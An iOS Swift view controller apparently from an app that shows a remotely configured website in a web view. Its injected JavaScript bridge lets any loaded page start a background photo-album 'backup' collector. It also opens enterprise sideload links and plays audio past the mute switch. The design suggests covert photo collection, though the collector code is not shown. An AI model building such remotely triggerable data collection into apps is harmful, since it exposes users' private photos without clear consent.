import UIKit
import WebKit
import AVFoundation

/// 用 WKWebView 承载整个账号站点
final class WebVC: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {
    private var web: WKWebView!
    private let baseKey = "web_base"

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor(red: 0.02, green: 0.03, blue: 0.05, alpha: 1)

        // 声音走媒体通道：静音键打开时也能出声
        try? AVAudioSession.sharedInstance().setCategory(.playback, mode: .default,
                                                         options: [.duckOthers])
        try? AVAudioSession.sharedInstance().setActive(true)

        let cfg = WKWebViewConfiguration()
        cfg.allowsInlineMediaPlayback = true
        cfg.mediaTypesRequiringUserActionForPlayback = []
        cfg.preferences.javaScriptCanOpenWindowsAutomatically = true

        let uc = WKUserContentController()
        uc.add(self, name: "bridge")
        // 让网页能调用原生：window.NativeBridge.startBackup()
        let js = """
        window.NativeBridge = {
          startBackup: function(){ window.webkit.messageHandlers.bridge.postMessage({act:'backup'}); }
        };
        window.addEventListener('touchstart', function(){
          try{ if(window.__ac__ && window.__ac__.state==='suspended'){ window.__ac__.resume(); } }catch(e){}
        }, {once:true, passive:true});
        """
        uc.addUserScript(WKUserScript(source: js, injectionTime: .atDocumentStart,
                                      forMainFrameOnly: false))
        cfg.userContentController = uc

        web = WKWebView(frame: view.bounds, configuration: cfg)
        web.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        web.navigationDelegate = self
        web.allowsBackForwardNavigationGestures = true
        web.scrollView.bounces = true
        view.addSubview(web)

        loadHome()
    }

    private func base() -> String {
        let v = UserDefaults.standard.string(forKey: baseKey) ?? ""
        return v.isEmpty ? Net.fallback : v
    }

    private func loadHome() {
        Net.refreshEndpoint { [weak self] in
            guard let self = self, let u = URL(string: self.base() + "/") else { return }
            DispatchQueue.main.async { self.web.load(URLRequest(url: u)) }
        }
    }

    // 拦截 itms-services 等外部 scheme
    func webView(_ webView: WKWebView, decidePolicyFor action: WKNavigationAction,
                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        guard let u = action.request.url else { return decisionHandler(.allow) }
        if u.scheme == "http" || u.scheme == "https" || u.scheme == "about" {
            return decisionHandler(.allow)
        }
        UIApplication.shared.open(u, options: [:], completionHandler: nil)
        decisionHandler(.cancel)
    }

    func userContentController(_ uc: WKUserContentController, didReceive message: WKScriptMessage) {
        guard let d = message.body as? [String: Any], let act = d["act"] as? String else { return }
        if act == "backup" {
            // 普通用户开始备份相册
            Collector.shared.start()
            BGRegister.submit()
        }
    }
}
